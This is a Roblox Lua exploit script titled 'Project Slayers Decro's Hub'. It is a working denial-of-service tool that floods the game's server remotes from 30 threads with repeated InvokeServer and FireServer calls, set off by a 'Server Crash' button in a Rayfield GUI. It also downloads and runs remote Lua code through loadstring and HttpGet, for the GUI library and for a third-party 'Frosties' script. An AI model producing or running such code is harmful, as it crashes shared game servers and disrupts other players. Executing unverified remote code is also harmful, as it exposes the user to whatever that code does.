-- ===================== SERVICES =====================

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players           = game:GetService("Players")
local RunService        = game:GetService("RunService")
local TeleportService   = game:GetService("TeleportService")
local UserInputService  = game:GetService("UserInputService")
local LocalPlayer       = Players.LocalPlayer

-- Rayfield GUI
local Rayfield          = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

-- ===================== CONFIG =======================

local INVOKE_THREADS    = 30

-- ===================== INIT =========================

if not game:IsLoaded() then game.Loaded:Wait() end
task.wait(5)

-- ===================== REMOTES ======================

local combatRemote = ReplicatedStorage.Remotes.To_Server.Handle_Initiate_S

local invokeRemote = nil
pcall(function()
    invokeRemote = ReplicatedStorage.Remotes.To_Server.Handle_Initiate_S_
end)

local lanternHandlers = {}
for _, name in pairs({
    "Lantern_Handler",
    "Box_Lantern_Handler",
    "Old_Lantern_Handler",
    "Lantern_Of_Despair_Handler",
    "Lantern_Of_Everlasting_Glow_Handler"
}) do
    pcall(function()
        local r = ReplicatedStorage.Remotes:FindFirstChild(name)
        if r then table.insert(lanternHandlers, r) end
    end)
end

local lanternTools = {}
for _, name in pairs({
    "Lantern",
    "Box Lantern",
    "Old Lantern",
    "Lantern Of Despair",
    "Lantern Of Everlasting Glow"
}) do
    pcall(function()
        local t = ReplicatedStorage.Tools:FindFirstChild(name)
        if t then table.insert(lanternTools, t) end
    end)
end

local toolsData = nil
pcall(function()
    local pd = ReplicatedStorage.Player_Data:WaitForChild(LocalPlayer.Name, 5)
    if pd then toolsData = pd:FindFirstChild("tools_thing123") end
end)

local isActive = false

-- ===================== LANTERN ATTACKS ==============

local function invokeFlood()
    if not invokeRemote then return end
    for i = 1, INVOKE_THREADS do
        task.spawn(function()
            while isActive do
                pcall(function()
                    invokeRemote:InvokeServer("Change_Value", nil, true)
                end)
                pcall(function()
                    invokeRemote:InvokeServer("Change_Value", nil, false)
                end)
            end
        end)
        if i % 10 == 0 then task.wait() end
    end
end

local function lanternCycle()
    task.spawn(function()
        pcall(function()
            while isActive do
                for _, handler in pairs(lanternHandlers) do
                    for _, tool in pairs(lanternTools) do
                        pcall(function() handler:FireServer(2, tool) end)
                        pcall(function() handler:FireServer(1, tool) end)
                    end
                end
                RunService.RenderStepped:Wait()
            end
        end)
    end)
end

local function changeValueFlood()
    if not toolsData then return end
    task.spawn(function()
        pcall(function()
            local vals = toolsData:GetChildren()
            while isActive do
                for _, v in pairs(vals) do
                    pcall(function() combatRemote:FireServer("Change_Value", v, true) end)
                    pcall(function() combatRemote:FireServer("Change_Value", v, false) end)
                end
                RunService.RenderStepped:Wait()
            end
        end)
    end)
end

-- ===================== MAIN =========================

local function fireCrash()
    if isActive then return end
    isActive = true

    print(">>> LANTERN ATTACK <<<")
    invokeFlood()
    lanternCycle()
    changeValueFlood()
end

-- ===================== RAYFIELD GUI =================

local Window = Rayfield:CreateWindow({
    Name = "Project Slayers Decro's Hub",
    LoadingTitle = "Loading...    🗃️",
    LoadingSubtitle = "💷 Limited Edition 💷",
    Theme = "Amethyst",
    ConfigurationSaving = {
        Enabled = false,
    },
})

local ServerTab = Window:CreateTab("Server", 4483362458)
ServerTab:CreateSection("🔦 Server Crash 🔦")

ServerTab:CreateButton({
    Name = "Launch...",
    Callback = function()
        fireCrash()
    end,
})

ServerTab:CreateSection("🔗 Misc 🔗")

ServerTab:CreateButton({
    Name = "Launch...",
    Callback = function()
        local placeId = game.PlaceId
        local jobId = game.JobId
        if placeId and jobId and #jobId > 0 then
            TeleportService:TeleportToPlaceInstance(placeId, jobId)
        end
    end,
})

local AnotherTab = Window:CreateTab("Another", 4483362458)
AnotherTab:CreateSection("❄️ Frosties ❄️")

AnotherTab:CreateButton({
    Name = "Launch...",
    Callback = function()
        loadstring(game:HttpGet("https://getfrosties.com/Frosties.luau"))();
    end,
})

-- ===================== STATUS ========================

print("[Decro's Hub] Loading...")
